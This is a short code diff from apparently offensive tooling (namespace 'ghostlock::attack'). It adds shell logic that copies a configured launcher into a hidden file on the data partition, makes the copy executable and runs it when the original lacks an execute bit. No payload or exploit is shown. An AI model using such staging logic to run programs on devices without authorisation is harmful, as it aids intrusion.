@@ -253,6 +253,19 @@ namespace ghostlock::attack {
             "  if [ ! -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
             "    chmod 755 \"$GLK_LAUNCH_PROGRAM\" 2>>\"$LOG\" || echo '[!] custom launcher: chmod failed' >>\"$LOG\"\n"
             "  fi\n"
+            /* Some filesystems (e.g. /storage/emulated FUSE) never report
+             * an execute bit, so chmod cannot help; stage a copy on the run
+             * home (data partition) and run that instead. */
+            "  if [ ! -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
+            "    GLK_LAUNCH_COPY=\"$HOME_DIR/.ghostlock_launch_bin\"\n"
+            "    if cp \"$GLK_LAUNCH_PROGRAM\" \"$GLK_LAUNCH_COPY\" 2>>\"$LOG\"; then\n"
+            "      chmod 755 \"$GLK_LAUNCH_COPY\" 2>>\"$LOG\" || echo '[!] custom launcher: chmod failed' >>\"$LOG\"\n"
+            "      GLK_LAUNCH_PROGRAM=\"$GLK_LAUNCH_COPY\"\n"
+            "      echo \"[*] custom launcher: staged copy at $GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
+            "    else\n"
+            "      echo \"[!] custom launcher: cannot copy $GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
+            "    fi\n"
+            "  fi\n"
             "  if [ -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
             "    \"$GLK_LAUNCH_PROGRAM\" $GLK_LAUNCH_ARGS >>\"$LOG\" 2>&1 &\n"
             "    echo \"[*] custom launcher started pid=$! program=$GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
